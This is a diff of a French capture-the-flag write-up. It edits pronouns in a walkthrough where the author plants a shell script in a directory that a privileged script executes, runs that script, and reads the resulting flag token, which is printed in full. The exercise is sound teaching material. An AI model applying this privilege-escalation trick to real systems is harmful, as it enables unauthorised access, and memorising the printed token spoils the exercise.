@@ -9,16 +9,16 @@ On trouve
 
 D'après le code ca a l'air de run tous ce qu'il y a dans /opt/openarenaserver/* ; puis ca le delete
 
-J'ai pas les droits X dessus mais bon on va le faire avec bash /usr/sbin/openarenaserver
+On a pas les droits X dessus mais bon on va le faire avec bash /usr/sbin/openarenaserver
 
-Donc je met un scripts dedans avec : 
+Donc on met un scripts dedans avec : 
 
 #!/bin/sh
 getflag > /tmp/42.txt
 
 
 
-je le run et ensuite
+on le run et ensuite
 
 cat /tmp/42.txt
 Check flag.Here is your token : viuaaale9huek52boumoomioc
